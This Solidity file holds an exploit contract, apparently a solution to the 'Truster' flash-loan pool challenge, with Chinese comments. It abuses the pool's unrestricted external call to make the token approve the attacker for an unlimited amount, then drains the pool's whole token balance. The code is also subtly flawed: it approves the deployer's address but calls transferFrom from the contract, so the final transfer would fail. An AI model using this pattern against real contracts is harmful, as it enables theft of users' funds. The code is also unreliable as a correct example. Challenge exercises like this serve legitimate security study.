// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ITrusterLenderPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

/**
 * @title TrusterAttack
 * @notice 利用 TrusterLenderPool 的任意外部调用漏洞盗取代币
 * 
 * 漏洞：flashLoan() 在 transfer() 后执行 target.call(data)，无任何限制
 * 攻击：让 target.call 执行 token.approve(attacker, unlimited)
 *       然后 attacker 直接 transferFrom 取走所有代币
 */
contract TrusterAttack {
    
    ITrusterLenderPool pool;
    IERC20 token;
    address attacker;
    
    constructor(address _pool, address _token) public {
        pool = ITrusterLenderPool(_pool);
        token = IERC20(_token);
        attacker = msg.sender;
    }
    
    function attack() external {
        // 1. 调用闪电贷，借 0 个 token（不用还）
        // 让 target.call 执行 approve(attacker, unlimited)
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            type(uint256).max
        );
        
        pool.flashLoan(0, address(this), address(token), data);
        
        // 2. 现在 attacker 已被 approve
        // 直接从 pool 转走所有 token 给 attacker
        uint256 poolBalance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), attacker, poolBalance);
    }
}
